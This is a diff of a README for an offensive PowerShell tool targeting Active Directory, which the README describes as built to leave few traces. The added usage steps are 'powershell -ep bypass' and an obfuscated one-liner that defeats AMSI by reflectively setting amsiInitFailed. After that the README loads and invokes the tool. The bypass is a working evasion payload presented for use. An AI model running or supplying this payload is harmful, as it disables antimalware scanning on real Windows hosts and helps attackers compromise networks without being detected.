@@ -11,12 +11,18 @@ It's written to leave as few traces as possible, so all the module will be loade
 ## Usage
 Before launching AdFortressBreaker it is necessary to bypass the AMSI control and powershell execution policy. After that user need to start a web server on port 8000 on his machine:
 ```
+powershell -ep bypass
+```
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+```
 . .\ADFortressBreaker.ps1
 ```
 ```
 Invoke-ADFortressBreaker
 ```
-
+<br><br>
 
 
 ![Screenshot_2023-10-17_113632](https://github.com/m4rkh4ck/ADFortressBreaker/assets/92309458/dd2e644b-48ed-45bb-9555-af8be53b35e5)
